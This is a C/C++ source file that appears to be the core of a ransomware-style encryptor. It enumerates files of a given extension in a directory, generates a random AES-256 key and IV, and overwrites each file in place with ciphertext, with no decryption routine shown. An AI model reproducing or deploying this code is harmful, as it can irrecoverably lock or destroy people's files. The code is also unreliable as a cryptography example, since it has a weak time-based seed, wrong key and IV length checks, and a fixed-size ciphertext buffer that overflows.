#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <termios.h>
#include <dirent.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/rand.h>

#include "main.h"

#define KeyLength (256/8)

/* Declaration of the C++ function to be called from C */
extern void DE::Update_key_iv(unsigned char* key, unsigned char* iv);

void DE::handleErrors(void)
{
    ERR_print_errors_fp(stderr);
    abort();
}

// RECIEVE INPUT ARRAY OF FILES AND ADD FILES OF A DESIGNATED EXTENSION TO A NEW ARRAY
void DE::Handle_Files(char input_files[100][100], char targeted_files[100][100], char directory[100], char extension[100]){
    
    // ADD ITEMS IN DIRECTORY TO input_files ARRAY
    DIR *d;
    struct dirent *dir;
    d = opendir(directory);                                 // open specific directory
    if (d) {
        int i=0;
        while ((dir = readdir(d)) != NULL) {
            strcpy(input_files[i],dir->d_name);             // copy file name to input_files array
            i++;
        }
    closedir(d);                                            //close the directory
    }

    int size = sizeof *input_files;
    int j = 0;

    // APPEND EACH FILE OF A CERTAIN EXTENSION TO targeted_files
    for(int i=0; i<=size; i++){

        char* ext_point = strrchr(input_files[i], '.');         // find "." in filename
        
        if (!ext_point) {
            continue;
        } else {
            char* filename = input_files[i];
            char ext[20];
            strncpy(ext,(ext_point+1),3);                       // stores extension

            int is_ext = strcmp(ext, extension);                // could be any extension, using txt here for simplicity
            if(is_ext == 0){
                strcpy(targeted_files[j],input_files[i]);       // place file into targeted_files array
                j++;
            }
        }
    };
}

void DE::Generate_key_iv(unsigned char* key, unsigned char* iv){
    // CREATE RANDOMIZED KEY AND IV THEN PASS THEM
    char salt = time(nullptr);                              // the key and iv creation should probably be a 
                                                            // one time use function... but I'll 
    RAND_seed(&salt, sizeof(salt));                         // probably just do it later.. to the TODO list!
    if (!RAND_bytes(key, sizeof key)) {
    /* OpenSSL reports a failure, act accordingly */        // lol the time is now! I did it.
        handleErrors();
    }
    if (!RAND_bytes(iv, sizeof iv)) {
    /* OpenSSL reports a failure, act accordingly */
        handleErrors();
    };

    //printf("C key: %u\n", key);
    //printf("C iv: %u\n\n", iv);
    DE::Update_key_iv(key, iv);
}

void DE::Encrypt_Files(char targeted_files[100][100], char directory[100], unsigned char* key, unsigned char* iv){

    int size = sizeof *targeted_files;

    for(int i=0; i<=size; i++){

        unsigned char path[100] = "";                       
        strcat(path, directory);                                // place directory into path
        strcat(path , targeted_files[i]);                       // place file into path

        FILE * file = fopen(path, "r");                         // open path

        if(strcmp(path, directory) == 0 || file == NULL)        // if file doesn't exist or is just the directory (blank space in array), continue through array
        {
            continue;             
        }else{

            // ACQUIRE THE DATA WITHIN THE FILE AND STORE IN BUFFER
            unsigned char *buffer;                             
            long filelen;

            fseek(file, 0, SEEK_END);                           // find end of the file
            filelen = ftell(file);                              // get the byte length of file
            rewind(file);                                       // jump back to the beginning of the file

            buffer = (char *)malloc(filelen * sizeof(char));    // make sure buffer has enough memory for the file
            fread(buffer, filelen, 1, file);                    // read in the entire file and store it in buffer
            fclose(file);                  

            // GO HERE TO LEARN ABOUT EVP_* interface:
            // https://wiki.openssl.org/index.php/EVP_Authenticated_Encryption_and_Decryption

            // PREP FOR THE ENCRYPTION
            unsigned char ciphertext[128];                      // buffer for the ciphertext
            int ciphertext_len;
            int len;

            EVP_CIPHER_CTX *ctx;

            if(!(ctx = EVP_CIPHER_CTX_new()))handleErrors();    // create new EVP cipher context

            if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))handleErrors(); // Initialise encryption

            if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, buffer, strlen ((char *)buffer)))handleErrors(); // supply message for encryption operation
            ciphertext_len = len;

            if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))handleErrors(); // finalize encryption operation 
            ciphertext_len += len;

            printf("ciphertext_len: \n");
            BIO_dump_fp (stdout, (const char *)ciphertext, ciphertext_len);
            printf("\n");

            EVP_CIPHER_CTX_free(ctx);                           // dump memory from previous EVP encryption operation

            // OVERWRITE FILE WITH ENCRYPTED DATA
            FILE * file = fopen(path, "w+");                    // reopen file 
            rewind(file);                                       // move to beginning of file
            fwrite(ciphertext, ciphertext_len, 1, file);        // write ciphertext to file
            fclose(file);
        }
    }
}

//literally just do it
void DE::Full_Encrypt(char input_files[100][100], char targeted_files[100][100], char directory[100], char extension[100], unsigned char* key, unsigned char* iv){
    Handle_Files(input_files, targeted_files, directory, extension);
    Encrypt_Files(targeted_files, directory, key, iv);
}